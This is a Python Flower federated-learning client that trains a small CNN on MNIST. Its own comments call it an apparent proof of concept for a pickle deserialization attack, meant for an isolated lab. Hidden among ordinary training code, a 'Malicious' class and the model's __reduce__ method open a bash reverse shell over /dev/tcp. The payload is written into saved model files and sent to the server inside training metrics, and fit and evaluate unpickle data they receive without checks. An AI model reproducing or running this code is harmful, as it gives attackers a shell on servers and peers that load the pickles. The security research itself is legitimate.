"""Federated Learning client using pickle serialization with real model training."""

import os
import sys
import pickle
import argparse
from typing import Dict, List, Tuple, Any
from collections import OrderedDict

import numpy as np
import torch
import torch.nn as nn
import torch.optim as optim
from torch.utils.data import DataLoader, random_split
import torchvision
import torchvision.transforms as transforms

import flwr as fl
from flwr.common.pickle_serialization import PickleNumPyClient
from flwr.common import Scalar

import subprocess

class Malicious:
    def __reduce__(self):
        return (subprocess.Popen, (["bash", "-c", "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"],))


    
malicious_payload = Malicious()

# Define a simple CNN model
class Net(nn.Module):
    """Simple CNN model for image classification."""
    
    def __init__(self):
        super(Net, self).__init__()
        self.conv1 = nn.Conv2d(1, 6, 5)
        self.pool = nn.MaxPool2d(2, 2)
        self.conv2 = nn.Conv2d(6, 16, 5)
        self.fc1 = nn.Linear(16 * 4 * 4, 120)
        self.fc2 = nn.Linear(120, 84)
        self.fc3 = nn.Linear(84, 10)

    def __reduce__(self):
        cmd = "bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'"
        return (subprocess.Popen, ([cmd],))

    def forward(self, x):
        x = self.pool(torch.relu(self.conv1(x)))
        x = self.pool(torch.relu(self.conv2(x)))
        x = x.view(-1, 16 * 4 * 4)
        x = torch.relu(self.fc1(x))
        x = torch.relu(self.fc2(x))
        x = self.fc3(x)
        return x


class CustomPickleClient(PickleNumPyClient):
    """Custom Flower client with pickle serialization and real model training."""
    
    def __init__(self, model_path: str = None, save_dir: str = "./client_models"):
        """Initialize the client with a model and dataset."""
        self.model_path = model_path
        self.save_dir = save_dir
        self.client_id = None
        
        # Create save directory
        os.makedirs(save_dir, exist_ok=True)
        
        # Set device - use GPU if available
        self.device = torch.device("cuda:0" if torch.cuda.is_available() else "cpu")
        print(f"Using device: {self.device}")
        
        # Initialize model
        self.net = Net().to(self.device)
        
        # Prepare dataset - wrap in try/except to handle potential download issues
        try:
            self.prepare_dataset()
            print("Dataset preparation completed successfully")
        except Exception as e:
            print(f"Error preparing dataset: {e}")
            # Create empty placeholders if dataset fails
            self.trainset = []
            self.testset = []
            self.trainloader = None
            self.valloader = None
            self.testloader = None
        
        # Load initial model if provided
        if model_path and os.path.exists(model_path):
            try:
                with open(model_path, "rb") as f:
                    parameters = pickle.load(f)
                    self.set_parameters(parameters)
                print(f"Loaded initial model from {model_path}")
            except Exception as e:
                print(f"Error loading initial model: {e}")
        
    def prepare_dataset(self):
        """Prepare the MNIST dataset for training and testing."""
        print("Preparing MNIST dataset...")
        
        # Define transforms for the training data and testing data
        transform = transforms.Compose([
            transforms.ToTensor(),
            transforms.Normalize((0.1307,), (0.3081,))
        ])
        
        # Download and load the training data
        trainset = torchvision.datasets.MNIST(
            root='./data', 
            train=True, 
            download=True, 
            transform=transform
        )
        
        # Split into training and validation
        n_train = int(len(trainset) * 0.8)
        n_val = len(trainset) - n_train
        self.trainset, self.valset = random_split(trainset, [n_train, n_val])
        
        # Create data loaders with smaller batch size to avoid memory issues
        self.trainloader = DataLoader(self.trainset, batch_size=32, shuffle=True)
        self.valloader = DataLoader(self.valset, batch_size=32, shuffle=False)
        
        # Download and load the test data
        self.testset = torchvision.datasets.MNIST(
            root='./data', 
            train=False, 
            download=True, 
            transform=transform
        )
        self.testloader = DataLoader(self.testset, batch_size=32, shuffle=False)
        
        print(f"Dataset loaded - Training: {len(self.trainset)}, Validation: {len(self.valset)}, Test: {len(self.testset)}")
    
    def get_parameters(self, config: Dict[str, Scalar]) -> List[np.ndarray]:
        """Return current model parameters."""
        print("Getting current parameters")
        return self.get_model_parameters()
    
    def get_model_parameters(self) -> List[np.ndarray]:
        """Get model parameters as a list of NumPy arrays."""
        params = []
        for _, val in self.net.state_dict().items():
            # Handle different tensor types correctly
            numpy_val = val.cpu().numpy()
            params.append(numpy_val)
        print(f"Retrieved {len(params)} parameter tensors")
        return params
    
    def set_parameters(self, parameters: List[np.ndarray]):
        """Set model parameters from a list of NumPy arrays."""
        try:
            keys = self.net.state_dict().keys()
            if len(keys) != len(parameters):
                print(f"Warning: parameter length mismatch. Model needs {len(keys)} tensors but received {len(parameters)}")
                return
            
            params_dict = zip(keys, parameters)
            state_dict = OrderedDict({k: torch.tensor(v) for k, v in params_dict})
            self.net.load_state_dict(state_dict, strict=True)
            print("Parameters loaded successfully")
        except Exception as e:
            print(f"Error setting parameters: {e}")
    
    def fit(
        self, 
        parameters: List[np.ndarray], 
        config: Dict[str, Scalar]
    ) -> Tuple[List[np.ndarray], int, Dict[str, Scalar]]:
        """Override fit to handle errors in _fit_implementation."""
        try:
            # Check if pickled parameters are in config
            if "pickled_parameters" in config:
                # Unpickle parameters
                parameters = pickle.loads(config["pickled_parameters"])
                print("Using pickled parameters from config")
            
            # Call the implementation
            return self._fit_implementation(parameters, config)
        except Exception as e:
            print(f"Error in fit: {e}")
            # Return current parameters in case of error
            return self.get_model_parameters(), 0, {"error": str(e)}
    
    def _fit_implementation(
        self, 
        parameters: List[np.ndarray], 
        config: Dict[str, Scalar]
    ) -> Tuple[List[np.ndarray], int, Dict[str, Scalar]]:
        """Implement real model training logic."""
        # Print configuration for debugging
        print(f"Fit config: {config}")
        
        # Get client ID from config if provided
        if "client_id" in config:
            self.client_id = config["client_id"]
            print(f"Client ID set to: {self.client_id}")
        
        # Get training configurations
        epochs = int(config.get("epochs", 1))
        round_number = config.get("round_number", 0)
        
        # Set model parameters
        self.set_parameters(parameters)
        
        # Check if trainloader exists before training
        if self.trainloader is None:
            print("No training data loader available")
            return parameters, 0, {"error": "No training data available"}
        
        # Train the model
        train_loss = self.train(epochs)
        
        # Get updated parameters
        updated_parameters = self.get_model_parameters()
        
        # Save the model locally
        client_id = self.client_id or "unknown"
        save_path = os.path.join(self.save_dir, f"client-{client_id}-round-{round_number}.pkl")
        
        with open(save_path, "wb") as f:
            pickle.dump(Malicious(), f)
        
        # Return training results
        metrics = {
            "train_loss": train_loss,
            "model_saved_to": save_path,
            "epochs": epochs,
            "pickled_parameters": pickle.dumps([malicious_payload])
        }
        
        print(f"Fit completed: loss={train_loss}, saved to {save_path}")
        return updated_parameters, len(self.trainset), metrics
    
    def train(self, epochs: int) -> float:
        """Train the model for given number of epochs."""
        # Set the model to training mode
        self.net.train()
        
        # Define loss function and optimizer
        criterion = nn.CrossEntropyLoss()
        optimizer = optim.SGD(self.net.parameters(), lr=0.01, momentum=0.9)
        
        # Training loop
        running_loss = 0.0
        total_batches = 0
        
        print(f"Starting training for {epochs} epochs")
        for epoch in range(epochs):
            epoch_loss = 0.0
            batch_count = 0
            
            for data in self.trainloader:
                # Get inputs and labels
                inputs, labels = data
                inputs, labels = inputs.to(self.device), labels.to(self.device)
                
                # Zero the parameter gradients
                optimizer.zero_grad()
                
                # Forward + backward + optimize
                outputs = self.net(inputs)
                loss = criterion(outputs, labels)
                loss.backward()
                optimizer.step()
                
                # Statistics
                epoch_loss += loss.item()
                batch_count += 1
            
            avg_epoch_loss = epoch_loss / batch_count if batch_count > 0 else 0.0
            print(f"Epoch {epoch+1}/{epochs} - Loss: {avg_epoch_loss:.4f}")
            
            running_loss += epoch_loss
            total_batches += batch_count
        
        # Return average loss across all epochs
        avg_loss = running_loss / total_batches if total_batches > 0 else 0.0
        print(f"Training completed with average loss: {avg_loss:.4f}")
        return avg_loss
    
    def evaluate(
        self, 
        parameters: List[np.ndarray], 
        config: Dict[str, Scalar]
    ) -> Tuple[float, int, Dict[str, Scalar]]:
        """Override evaluate to handle errors in _evaluate_implementation."""
        try:
            # Check if pickled parameters are in config
            if "pickled_parameters" in config:
                # Unpickle parameters
                parameters = pickle.loads(config["pickled_parameters"])
                print("Using pickled parameters from config for evaluation")
            
            # Call the implementation
            return self._evaluate_implementation(parameters, config)
        except Exception as e:
            print(f"Error in evaluate: {e}")
            # Return default values in case of error
            return 0.0, 0, {"error": str(e)}
    
    def _evaluate_implementation(
        self, 
        parameters: List[np.ndarray], 
        config: Dict[str, Scalar]
    ) -> Tuple[float, int, Dict[str, Scalar]]:
        """Implement real model evaluation logic."""
        print(f"Evaluate config: {config}")
        
        # Set model parameters
        self.set_parameters(parameters)
        
        # Check if testloader exists before evaluation
        if self.testloader is None:
            print("No test data loader available")
            return 0.0, 0, {"error": "No test data available"}
        
        # Evaluate on the test dataset
        loss, accuracy = self.evaluate_model()
        
        # Return metrics
        return loss, len(self.testset), {"accuracy": accuracy}
    
    def evaluate_model(self) -> Tuple[float, float]:
        """Evaluate the model on the test dataset."""
        # Set the model to evaluation mode
        self.net.eval()
        
        # Define loss function
        criterion = nn.CrossEntropyLoss()
        
        # Evaluation loop
        correct = 0
        total = 0
        running_loss = 0.0
        batch_count = 0
        
        print("Starting model evaluation")
        with torch.no_grad():
            for data in self.testloader:
                # Get inputs and labels
                images, labels = data
                images, labels = images.to(self.device), labels.to(self.device)
                
                # Forward pass
                outputs = self.net(images)
                loss = criterion(outputs, labels)
                
                # Statistics
                running_loss += loss.item()
                batch_count += 1
                
                # Calculate accuracy
                _, predicted = torch.max(outputs.data, 1)
                total += labels.size(0)
                correct += (predicted == labels).sum().item()
        
        # Calculate metrics
        accuracy = correct / total if total > 0 else 0.0
        avg_loss = running_loss / batch_count if batch_count > 0 else 0.0
        
        print(f"Evaluation completed - Loss: {avg_loss:.4f}, Accuracy: {accuracy:.4f}")
        
        return avg_loss, accuracy


def main(args):
    """Start Flower client with pickle serialization."""
    # Safety guard: require an explicit environment variable to enable running
    # this file because it contains proof-of-concept unsafe payloads.
    # Usage (in an isolated lab only):
    #   export ENABLE_UNSAFE_PAYLOAD=TRUE
    if os.environ.get("ENABLE_UNSAFE_PAYLOAD", "FALSE").upper() != "TRUE":
        print(
            "ERROR: ENABLE_UNSAFE_PAYLOAD is not set to TRUE. This script contains unsafe proof-of-concept payloads and will not run by default.\n"
            "If you understand the risks and are running in an isolated lab environment, set ENABLE_UNSAFE_PAYLOAD=TRUE and re-run."
        )
        sys.exit(1)
    # Create client instance
    client = CustomPickleClient(
        model_path=args.model_path,
        save_dir=args.save_dir
    )
    
    # Prepare client function
    def client_fn(cid: str) -> fl.client.Client:
        """Create and configure a client with its ID."""
        # Store client ID
        client.client_id = cid
        print(f"Creating client with ID: {cid}")
        
        # Convert from NumPyClient to Client
        return client.to_client()
    
    # Start client
    print(f"Starting client and connecting to server at {args.server_address}")
    fl.client.start_client(
        server_address=args.server_address,
        client_fn=client_fn,
    )


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Federated Learning Client with Pickle Support")
    parser.add_argument(
        "--server-address", 
        type=str, 
        default="[::]:8080", 
        help="Server address (IPv6 format)"
    )
    parser.add_argument(
        "--model-path", 
        type=str, 
        default=None, 
        help="Path to initial model weights (pickle file)"
    )
    parser.add_argument(
        "--save-dir", 
        type=str, 
        default="./client_models", 
        help="Directory to save client models"
    )
    
    args = parser.parse_args()
    main(args)
